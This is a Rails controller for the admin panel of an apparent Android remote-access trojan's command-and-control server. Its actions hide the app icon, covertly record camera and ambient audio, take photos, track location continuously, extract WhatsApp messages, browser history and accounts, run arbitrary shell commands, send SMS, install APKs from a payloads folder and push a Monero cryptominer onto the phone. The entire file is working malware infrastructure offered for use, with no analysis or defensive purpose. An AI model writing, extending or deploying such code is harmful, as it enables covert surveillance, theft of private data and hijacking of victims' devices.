class SmartphonesController < InheritedResources::Base
  before_action :authenticate_admin_user!
  # Thread-safe recording state managed via Smartphone.is_recording column

  def dump_sysinfo
    begin
      smartphone_id = params[:smartphone_id].to_s.gsub(/[^a-zA-Z0-9_-]/, '')
      smartphone = Smartphone.find(smartphone_id)
      
      # Send command via ActionCable to Android app
      command_data = {
        command: "get_device_info",
        timestamp: Time.now.to_i
      }
      
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        command_data
      )
      
      commandOutput = ["Command sent to device #{smartphone.device_id}", "Waiting for response..."]
    rescue => e
      Rails.logger.error("Error on dump sysinfo: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "dump_sysinfo",
               :locals => { :commandOutput => commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) } }
      }
    end
  end

  def webcam_record
    begin
      safe_id = params[:smartphone_id].to_s.gsub(/[^a-zA-Z0-9_-]/, '')
      @smartphone = Smartphone.find(safe_id)
      camera_id = params[:back_camera] == "true" ? "0" : "1"
      
      if !@smartphone.is_recording
        # Start camera stream
        pending_command = send_command_async(@smartphone, 'start_camera', { camera_id: camera_id })
        @smartphone.update(is_recording: true)
        commandOutput = ["Camera recording started (ID: #{camera_id})"]
      else
        # Stop camera stream
        pending_command = send_command_async(@smartphone, 'stop_camera', {})
        @smartphone.update(is_recording: false)
        commandOutput = ["Camera recording stopped"]
      end
      
    rescue => e
      Rails.logger.error("Error on webcam record: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "webcam_record", locals: { 
          commandOutput: commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) }, 
          fileName: ActionController::Base.helpers.sanitize(@fileNameHtml.to_s) 
        }
      }
    end
  end

  # Audio mode now handled by set_audio_mode below (uses ActionCable)
  
  def dump_wifi_info
    begin
      safe_id = params[:smartphone_id].to_s.gsub(/[^a-zA-Z0-9_-]/, '')
      @smartphone = Smartphone.find(safe_id)

      # Send async command to get WiFi info
      pending_command = send_command_async(
        @smartphone,
        'get_wifi_info',
        {}
      )

      commandOutput = ["WiFi info command sent (Request ID: #{pending_command.request_id})", "Check device for results"]

    rescue => e
      Rails.logger.error("Error dumping wifi info: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "dump_wifi_info", locals: { commandOutput: commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) } }
      }
    end
  end

  def dump_localtime
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to get device local time
      pending_command = send_command_async(
        @smartphone,
        'get_localtime',
        {}
      )

      commandOutput = ["Local time command sent (Request ID: #{pending_command.request_id})", "Check device for results"]

    rescue => e
      Rails.logger.error("Error getting device time: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "dump_localtime", locals: { commandOutput: commandOutput }
      }
    end
  end

  # Alias for dump_localtime (RESTful naming)
  def get_localtime
    dump_localtime
  end

  # Alias for dump_wifi_info (RESTful naming)
  def get_wifi_info
    dump_wifi_info
  end

  def uninstall_app
    begin
      app_name = params[:app] || params[:package_name]
      @smartphone = Smartphone.find(params[:smartphone_id])

      if app_name.present?
        # Send async command
        pending_command = send_command_async(
          @smartphone,
          'uninstall_app',
          { package_name: app_name }
        )

        commandOutput = ["App uninstall command sent: #{app_name} (Request ID: #{pending_command.request_id})"]
      else
        commandOutput = ["No app name provided"]
      end

    rescue => e
      Rails.logger.error("Error uninstalling app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "uninstall_app",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def list_apps
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'get_installed_apps', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        apps_data = pending_command.response_data['apps'] || []
        commandOutput = apps_data.map { |app| "#{app['package_name']} (#{app['app_name']})" }
        commandOutput = ["No apps found"] if commandOutput.empty?
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error listing apps: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "list_apps", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def install_apk
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      apk_file_param = params[:apk_file] || params[:file_path] || params[:file_url]

      if apk_file_param.present?
        # Handle file upload or URL
        if apk_file_param.is_a?(ActionDispatch::Http::UploadedFile)
          # Save uploaded file to public/uploads
          upload_dir = Rails.root.join('public', 'uploads', 'apk')
          FileUtils.mkdir_p(upload_dir) unless Dir.exist?(upload_dir)
          
          filename = SecureRandom.uuid + File.extname(apk_file_param.original_filename)
          filepath = upload_dir.join(filename)
          
          File.write(filepath, apk_file_param.read)
          apk_path = "/uploads/apk/#{filename}"
        else
          # Use provided path or URL
          apk_path = apk_file_param
        end

        # Send async command with file path/URL
        pending_command = send_command_async(
          @smartphone,
          'install_apk',
          { apk_path: apk_path }
        )

        commandOutput = ["APK installation command sent (Request ID: #{pending_command.request_id})"]
      else
        commandOutput = ["No APK file or path provided"]
      end

    rescue => e
      Rails.logger.error("Error installing APK: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "install_apk", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def run_app
    begin
      app_name = params[:app] || params[:package_name]
      @smartphone = Smartphone.find(params[:smartphone_id])

      if app_name.present?
        # Send async command
        pending_command = send_command_async(
          @smartphone,
          'launch_app',
          { package_name: app_name }
        )

        commandOutput = ["App launch command sent: #{app_name} (Request ID: #{pending_command.request_id})"]
      else
        commandOutput = ["No app specified"]
      end

    rescue => e
      Rails.logger.error("Error running app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "run_app", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def send_sms_message
    begin
      phone_number = params[:phone_number]
      message = params[:message]
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if phone_number.present? && message.present?
        pending_command = send_command_and_wait(
          @smartphone, 
          'send_sms', 
          { phone_number: phone_number, message: message }, 
          timeout: 15.seconds
        )
        
        if pending_command.completed?
          commandOutput = ["SMS sent to #{phone_number}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["Missing phone number or message"]
      end
      
    rescue => e
      Rails.logger.error("Error sending SMS: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "send_sms", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def screen_unlock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to unlock screen
      pending_command = send_command_async(
        @smartphone,
        'unlock_screen',
        {}
      )

      commandOutput = ["Screen unlock command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "screen_unlock", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def hide_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to hide app icon
      pending_command = send_command_async(
        @smartphone,
        'hide_icon',
        {}
      )

      @smartphone.update(is_app_hidden: true)
      commandOutput = ["App hide command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error hiding icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "hide_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def show_app_icon
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      # Send async command to show app icon
      pending_command = send_command_async(
        @smartphone,
        'show_icon',
        {}
      )

      @smartphone.update(is_app_hidden: false)
      commandOutput = ["App show command sent (Request ID: #{pending_command.request_id})"]

    rescue => e
      Rails.logger.error("Error showing icon: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "show_app_icon", locals: { commandOutput: commandOutput }
      }
    end
  end
  
  def set_audio_mode
    begin
      mode = params[:mode] # 'silent', 'vibrate', 'normal'
      @smartphone = Smartphone.find(params[:smartphone_id])

      if mode.present?
        # Send async command to change audio mode
        pending_command = send_command_async(
          @smartphone,
          'change_audio_mode',
          { mode: mode }
        )

        commandOutput = ["Audio mode change command sent: #{mode} (Request ID: #{pending_command.request_id})"]
      else
        commandOutput = ["No mode specified"]
      end

    rescue => e
      Rails.logger.error("Error setting audio mode: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js {
        render "set_audio_mode", locals: { commandOutput: commandOutput }
      }
    end
  end

  def upload_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      local_file = params[:push_file]
      remote_dest = params[:destination]
      
      # Future: implement chunked upload via ActionCable
      commandOutput = ["File upload not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error uploading file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "upload_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def wake_lock
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["Screen unlocked successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error unlocking screen: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "wake_lock", locals: { commandOutput: commandOutput }
      }
    end
  end

  def run_shell_command
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      command = params[:command]
      
      pending_command = send_command_and_wait(@smartphone, 'shell_exec', { command: command }, timeout: 30.seconds)
      
      if pending_command.completed?
        output = pending_command.response_data['output'] || ''
        commandOutput = output.split("\n")
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error running shell command: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "run_shell_command", locals: { commandOutput: commandOutput }
      }
    end
  end

  def open_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      app_package = params[:app]
      
      if app_package.present?
        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_package }, timeout: 15.seconds)
        
        if pending_command.completed?
          commandOutput = ["App launched: #{app_package}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["No app specified"]
      end
      
    rescue => e
      Rails.logger.error("Error opening app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "open_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def install_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      app_path = params[:app]
      
      # SECURITY: Validate path to prevent directory traversal attacks
      if app_path.present?
        # Normalize and validate path
        normalized_path = File.expand_path(app_path)
        allowed_dirs = [
          Rails.root.join('files', 'payloads').to_s,
          Rails.root.join('tools').to_s
        ]
        
        unless allowed_dirs.any? { |dir| normalized_path.start_with?(dir) }
          commandOutput = ["Error: Invalid file path - access denied"]
          respond_to do |format|
            format.js { render "install_app", locals: { commandOutput: commandOutput } }
          end
          return
        end
        
        if File.exist?(normalized_path) && File.file?(normalized_path)
          apk_data = File.read(normalized_path)
          apk_base64 = Base64.strict_encode64(apk_data)
        
          pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
        
          if pending_command.completed?
            commandOutput = ["Installation started"]
          else
            commandOutput = ["Operation Failed"]
          end
        else
          commandOutput = ["APK file not found: #{app_path}"]
        end
      else
        commandOutput = ["No app path specified"]
      end
      
    rescue => e
      Rails.logger.error("Error installing app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "install_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def get_accounts
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      
      # Send command via ActionCable to Android app
      command_data = {
        command: "get_accounts",
        timestamp: Time.now.to_i
      }
      
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        command_data
      )
      
      commandOutput = ["Get accounts command sent to device #{smartphone.device_id}", "Waiting for response..."]
    rescue => e
      Rails.logger.error("[SmartphonesController] get_accounts failed: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "get_accounts",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def toggle_wifi
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      
      # Send command via ActionCable to Android app
      command_data = {
        command: "toggle_wifi",
        timestamp: Time.now.to_i
      }
      
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        command_data
      )
      
      commandOutput = ["Toggle Wi-Fi command sent to device #{smartphone.device_id}", "Waiting for response..."]
    rescue => e
      Rails.logger.error("[SmartphonesController] toggle_wifi failed: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "toggle_wifi",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  def dump_device_info
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
      
      if pending_command.completed?
        info = pending_command.response_data
        commandOutput = [
          "Brand: #{info['brand']}",
          "Model: #{info['model']}",
          "OS: #{info['os_version']}",
          "SDK: #{info['sdk_version']}",
          "Battery: #{info['battery_level']}%"
        ]
      else
        commandOutput = ["Operation Failed"]
      end
    rescue => e
      Rails.logger.error("Error dumping device info: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "dump_device_info", locals: { commandOutput: commandOutput }
      }
    end
  end

  def pull_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      remote_path = params[:pull_file]
      local_dest = params[:destination]
      
      # Future: implement chunked file transfer via ActionCable
      # For now, just acknowledge command
      commandOutput = ["File transfer not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error pulling file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js {
        render "pull_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def hide_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon hidden successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error hiding app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "hide_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def show_app
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
      
      if pending_command.completed?
        commandOutput = ["App icon shown successfully"]
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error showing app: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "show_app", locals: { commandOutput: commandOutput }
      }
    end
  end

  def crypto_miner
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Read monero miner APK and encode to Base64
      miner_apk_path = Rails.root.join('tools', 'monero-miner.apk')
      if File.exist?(miner_apk_path)
        apk_base64 = Base64.strict_encode64(File.binread(miner_apk_path))
        
        # Note: This is a "loud" feature that triggers heat/battery alerts
        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
        
        if pending_command.completed?
          commandOutput = ["Monero miner installed successfully on #{@smartphone.name}"]
        else
          commandOutput = ["Installation Failed: #{pending_command.response_data&.dig('error') || 'Device timeout'}"]
        end
      else
        commandOutput = ["Monero miner APK not found at tools/monero-miner.apk"]
      end
      
    rescue => e
      Rails.logger.error("Error installing crypto miner: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "crypto_minner", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dropdown_list_smartphones
    render locals: { smartphones: smartphones,
                     smartphone: smartphone }
  end

  def select_smartphone
    redirect_to controller: "admin/dashboard",
      action: "index",
      selected_smartphone_id: params[:smartphone_id]
  end

  def load
    render
  end

  def install
    path = "installsomething.txt"
    content = "data from the form"
    File.open(path, "w+") do |f|
      f.write(content)
    end
  end

  def take_picture
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      camera = params[:back_camera] == "false" ? "1" : "0"
      
      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: camera }, timeout: 30.seconds)
      
      if pending_command.completed?
        photo_data = pending_command.response_data
        if photo_data && photo_data['image_base64'].present?
          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
          file_name = "webcam_snap_#{currentTimeFormat}.jpeg"
          image_bytes = Base64.decode64(photo_data['image_base64'])
          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, image_bytes)
          
          Picture.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: file_name,
            smartphone_id: @smartphone.id
          )
          commandOutput = ["Photo captured: #{file_name} (#{image_bytes.size} bytes)"]
        else
          commandOutput = ["Operation Failed: No image data received"]
        end
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error taking picture: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "take_picture", locals: { commandOutput: commandOutput } }
    end
  end

  def front_camera_snap
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: "1" }, timeout: 30.seconds)
      
      if pending_command.completed?
        photo_data = pending_command.response_data
        if photo_data && photo_data['image_base64'].present?
          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
          file_name = "front_cam_#{currentTimeFormat}.jpeg"
          image_bytes = Base64.decode64(photo_data['image_base64'])
          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, image_bytes)
          
          Picture.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: file_name,
            smartphone_id: @smartphone.id
          )
          commandOutput = ["Front camera photo: #{file_name} (#{image_bytes.size} bytes)"]
        else
          commandOutput = ["Operation Failed: No image data received"]
        end
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error taking front camera snap: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "front_camera_snap", locals: { commandOutput: commandOutput } }
    end
  end

  def check_root
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Send command asynchronously via ActionCable
      pending_command = send_command_async(@smartphone, 'check_root', {})
      
      commandOutput = ["Checking root status..."]
      
    rescue => e
      Rails.logger.error("Error checking root: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "check_root", locals: { commandOutput: commandOutput }
      }
    end
  end

  def interval_geolocate
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      interval = (params[:interval] || 60).to_i.clamp(1, 3600)
      
      # Send command asynchronously via ActionCable
      # Device will collect location at regular intervals
      pending_command = send_command_async(@smartphone, 'start_continuous_location', { interval: interval })
      
      commandOutput = ["Location tracking started (interval: #{interval}s)"]
      
    rescue => e
      Rails.logger.error("Error starting interval geolocate: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "interval_geolocate", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dump_whatsapp_messages
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Send command asynchronously via ActionCable
      # WhatsAppResponseProcessor will handle saving the messages
      pending_command = send_command_async(@smartphone, 'dump_whatsapp_messages', {})
      
      commandOutput = ["WhatsApp message extraction initiated..."]
      
    rescue => e
      Rails.logger.error("Error dumping WhatsApp messages: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_whatsapp_messages", locals: { commandOutput: commandOutput }
      }
    end
  end

  def ambient_record
    begin
      smartphone_id = params[:smartphone_id]
      smartphone = Smartphone.find(smartphone_id)
      duration = (params[:duration] || 60).to_i.clamp(1, 3600)

      command_data = {
        command: "ambient_record",
        duration: duration,
        timestamp: Time.now.to_i
      }
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        command_data
      )
      commandOutput = ["🌙 Ambient recording started (#{duration}s) on #{smartphone.name}"]
    rescue => e
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "ambient_record", locals: { commandOutput: commandOutput } }
    end
  end

  def browse_files
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      path = params[:path] || "/sdcard"
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        { command: "browse_files", params: { path: path }, timestamp: Time.now.to_i }
      )
      commandOutput = ["📂 Browsing #{path} on #{smartphone.name}"]
    rescue => e
      commandOutput = ["Error: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "browse_files", locals: { commandOutput: commandOutput } }
    end
  end

  def get_app_usage
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        { command: "get_app_usage", timestamp: Time.now.to_i }
      )
      commandOutput = ["📊 Collecting app usage from #{smartphone.name}"]
    rescue => e
      commandOutput = ["Error: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "get_app_usage", locals: { commandOutput: commandOutput } }
    end
  end

  def get_browser_history
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        { command: "get_browser_history", timestamp: Time.now.to_i }
      )
      commandOutput = ["🌐 Collecting browser history from #{smartphone.name}"]
    rescue => e
      commandOutput = ["Error: #{e.message}"]
    end
    respond_to do |format|
      format.js { render "get_browser_history", locals: { commandOutput: commandOutput } }
    end
  end

  # WebRTC Live Streaming
  def start_webrtc_stream
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      stream_type = params[:stream_type] || 'camera'

      # Send async command to device to start WebRTC streaming
      pending_command = send_command_async(
        @smartphone,
        'start_webrtc_stream',
        { stream_type: stream_type }
      )

      commandOutput = ["🎥 WebRTC stream initiated (#{stream_type})"]
    rescue => e
      Rails.logger.error("Error starting WebRTC stream: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    respond_to do |format|
      format.js { render "start_webrtc_stream", locals: { commandOutput: commandOutput } }
    end
  end

  private

  def smartphone_params
    params.require(:smartphone).permit(:operating_system,
                                       :name,
                                       :pictures,
                                       :screenshots,
                                       :videos,
                                       :recordings,
                                       :is_rooted,
                                       :call_logs,
                                       :contacts,
                                       :sms_messages,
                                       :geo_locations,
                                       :is_app_hidden)
  end
  
  def command_service_for(smartphone)
    DeviceCommandService.new(smartphone)
  end

  def send_command_async(smartphone, command, params = {})
    command_service_for(smartphone).queue_command(command, params)
  end

  def send_command_and_wait(smartphone, command, params = {}, timeout: 30.seconds)
    command_service_for(smartphone).wait_for_command(command, params, timeout: timeout)
  end
  
  # Helper method to send commands via ActionCable to Android device
  def send_command_to_device(smartphone, command, params = {})
    command_data = {
      command: command,
      params: params,
      timestamp: Time.now.to_i
    }
    
    ActionCable.server.broadcast(
      "commands_#{smartphone.device_id}",
      command_data
    )
    
    Rails.logger.info "Sent command #{command} to device #{smartphone.device_id}"
  end
end
